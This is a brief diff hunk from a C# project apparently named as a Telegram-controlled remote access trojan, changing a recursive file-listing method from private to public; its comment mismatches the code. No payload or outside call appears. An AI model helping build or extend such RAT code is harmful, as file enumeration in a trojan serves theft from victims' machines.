@@ -40,7 +40,7 @@ namespace RAT_BotTelegram.Lib {
             return Info;
         }
 
-        private static string[] GetFile(string dir) {
+        public static string[] GetFile(string dir) {
             // Obtiene Nombre del procesador
             string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
 
